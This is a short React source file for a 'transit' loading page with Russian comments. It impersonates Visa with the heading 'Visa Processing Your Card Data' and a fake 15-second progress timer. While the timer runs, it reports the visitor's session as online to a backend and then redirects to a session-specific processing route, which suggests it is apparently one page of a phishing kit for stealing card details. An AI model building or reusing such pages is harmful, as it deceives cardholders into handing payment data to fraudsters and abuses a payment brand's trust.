import { useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import styles from "./Transit.module.css";

const Transit1 = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const sessionId = localStorage.getItem("currentSessionId");

  useEffect(() => {
    window.scrollTo(0, 0);
    
    // Отправляем статус онлайн
    const updateOnlineStatus = async () => {
      try {
        await fetch("/api/update-online-status", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            sessionId: sessionId,
            page: "transit-1"
          }),
        });
      } catch (error) {
        console.error("Error updating online status:", error);
      }
    };

    updateOnlineStatus();
    
    // Таймер на 15 секунд
    const timer = setTimeout(() => {
      navigate(`/site/process/${sessionId}`, { 
        state: { from: location.pathname },
        replace: true 
      });
    }, 15000);

    return () => clearTimeout(timer);
  }, [navigate, location, sessionId]);

  return (
    <div className={styles.container}>
      <div className={styles.loaderContainer}>
        <div className={styles.spinner}></div>
        <h1 className={styles.title}>Visa Processing Your Card Data</h1>
        <p className={styles.subtitle}>
          Please wait while we securely process your payment information...
        </p>
        <div className={styles.progressBar}>
          <div className={styles.progressFill}></div>
        </div>
        <div className={styles.timer}>Processing... 15 seconds</div>
      </div>
    </div>
  );
};

export default Transit1;